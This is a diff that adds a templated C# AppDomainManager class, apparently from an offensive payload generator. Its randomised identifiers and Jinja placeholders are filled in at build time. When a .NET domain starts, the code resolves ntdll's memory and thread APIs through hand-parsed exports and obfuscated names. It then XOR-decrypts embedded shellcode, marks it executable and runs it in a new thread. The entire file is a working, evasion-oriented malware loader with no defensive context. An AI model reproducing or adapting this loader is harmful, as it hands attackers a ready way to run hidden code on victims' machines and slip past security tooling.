@@ -1,0 +1,108 @@
+using System;
+using System.Runtime.InteropServices;
+
+namespace {{ appdomain_namespace }} {
+    public class {{ appdomain_type_name }} : AppDomainManager {
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate int D_NtAVM(IntPtr ph, ref IntPtr ba, UIntPtr zb, ref UIntPtr rs, uint at, uint prot);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate int D_NtPVM(IntPtr ph, ref IntPtr ba, ref UIntPtr rs, uint np, out uint op);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate int D_NtCTX(out IntPtr hT, uint da, IntPtr oa, IntPtr ph, IntPtr sa,
+            IntPtr p, bool cs, IntPtr szb, IntPtr ssc, IntPtr ssr, IntPtr al);
+
+        static string B(int[] c) {
+            var sb = new System.Text.StringBuilder();
+            foreach (var x in c) sb.Append((char)x);
+            return sb.ToString();
+        }
+
+        static byte[] N(int[] c) {
+            var b = new byte[c.Length + 1];
+            for (int i = 0; i < c.Length; i++) b[i] = (byte)c[i];
+            return b;
+        }
+
+        static byte[] {{ v.fn_hex }}(string h) {
+            var b = new byte[h.Length / 2];
+            for (int i = 0; i < b.Length; i++)
+                b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
+            return b;
+        }
+
+        static byte[] {{ v.fn_xor }}(byte[] d, byte[] k) {
+            var o = new byte[d.Length];
+            for (int i = 0; i < d.Length; i++) o[i] = (byte)(d[i] ^ k[i % k.Length]);
+            return o;
+        }
+
+        static IntPtr {{ v.fn_getexport }}(IntPtr mod, byte[] name) {
+            try {
+                int peo    = Marshal.ReadInt32(mod, 0x3C);
+                int exprva = Marshal.ReadInt32(IntPtr.Add(mod, peo + 0x88));
+                if (exprva == 0) return IntPtr.Zero;
+                IntPtr ed  = IntPtr.Add(mod, exprva);
+                int nn     = Marshal.ReadInt32(ed, 0x18);
+                int nrva   = Marshal.ReadInt32(ed, 0x20);
+                int orva   = Marshal.ReadInt32(ed, 0x24);
+                int frva   = Marshal.ReadInt32(ed, 0x1C);
+                for (int i = 0; i < nn; i++) {
+                    IntPtr np = IntPtr.Add(mod, Marshal.ReadInt32(IntPtr.Add(mod, nrva + i * 4)));
+                    bool ok = true;
+                    for (int j = 0; j < name.Length; j++)
+                        if (Marshal.ReadByte(IntPtr.Add(np, j)) != name[j]) { ok = false; break; }
+                    if (!ok) continue;
+                    short ord = Marshal.ReadInt16(IntPtr.Add(mod, orva + i * 2));
+                    return IntPtr.Add(mod, Marshal.ReadInt32(IntPtr.Add(mod, frva + ord * 4)));
+                }
+            } catch {}
+            return IntPtr.Zero;
+        }
+
+        public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
+            IntPtr ntdll = IntPtr.Zero;
+            foreach (System.Diagnostics.ProcessModule m in
+                     System.Diagnostics.Process.GetCurrentProcess().Modules)
+                if (m.ModuleName.ToLower() == B(new int[]{ {{ v.jsc_ntdll_dll }} })) {
+                    ntdll = m.BaseAddress; break;
+                }
+            if (ntdll == IntPtr.Zero) return;
+
+            IntPtr {{ v.fn_exec }}_alloc = {{ v.fn_getexport }}(ntdll, N(new int[]{ {{ v.jsc_nt_alloc_vm }} }));
+            IntPtr {{ v.fn_exec }}_prot  = {{ v.fn_getexport }}(ntdll, N(new int[]{ {{ v.jsc_nt_prot_vm }} }));
+            IntPtr {{ v.fn_exec }}_thrd  = {{ v.fn_getexport }}(ntdll, N(new int[]{ {{ v.jsc_nt_create_thread_ex }} }));
+            if ({{ v.fn_exec }}_alloc == IntPtr.Zero ||
+                {{ v.fn_exec }}_prot  == IntPtr.Zero ||
+                {{ v.fn_exec }}_thrd  == IntPtr.Zero) return;
+
+            var {{ v.fn_nt_alloc }} = (D_NtAVM)Marshal.GetDelegateForFunctionPointer(
+                {{ v.fn_exec }}_alloc, typeof(D_NtAVM));
+            var {{ v.fn_nt_prot }}  = (D_NtPVM)Marshal.GetDelegateForFunctionPointer(
+                {{ v.fn_exec }}_prot,  typeof(D_NtPVM));
+            var {{ v.fn_nt_thread }} = (D_NtCTX)Marshal.GetDelegateForFunctionPointer(
+                {{ v.fn_exec }}_thrd,  typeof(D_NtCTX));
+
+            byte[] {{ v.var_key }} = {{ v.fn_hex }}({% for c in key_chunks %}"{{ c }}"{% if not loop.last %}+{% endif %}{% endfor %});
+            for (int {{ v.var_iv }}_i = 0; {{ v.var_iv }}_i < {{ v.var_key }}.Length; {{ v.var_iv }}_i++)
+                {{ v.var_key }}[{{ v.var_iv }}_i] ^= (byte){{ key_tweak }};
+            byte[] {{ v.var_shellcode }} = {{ v.fn_xor }}(
+                {{ v.fn_hex }}({% for c in shellcode_chunks %}"{{ c }}"{% if not loop.last %}+{% endif %}{% endfor %}),
+                {{ v.var_key }});
+
+            IntPtr {{ v.var_region }} = IntPtr.Zero;
+            UIntPtr {{ v.var_fiber }} = (UIntPtr){{ v.var_shellcode }}.Length;
+            if ({{ v.fn_nt_alloc }}((IntPtr)(-1), ref {{ v.var_region }}, UIntPtr.Zero,
+                    ref {{ v.var_fiber }}, 0x3000, 0x04) != 0) return;
+            Marshal.Copy({{ v.var_shellcode }}, 0, {{ v.var_region }}, {{ v.var_shellcode }}.Length);
+            uint {{ v.fn_setup }}_old;
+            {{ v.fn_nt_prot }}((IntPtr)(-1), ref {{ v.var_region }},
+                ref {{ v.var_fiber }}, 0x20, out {{ v.fn_setup }}_old);
+            IntPtr {{ v.fn_run }}_h;
+            {{ v.fn_nt_thread }}(out {{ v.fn_run }}_h, 0x1FFFFF, IntPtr.Zero, (IntPtr)(-1),
+                {{ v.var_region }}, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+            if ({{ v.fn_run }}_h != IntPtr.Zero)
+                System.Threading.Thread.Sleep(30000);
+        }
+    }
+}
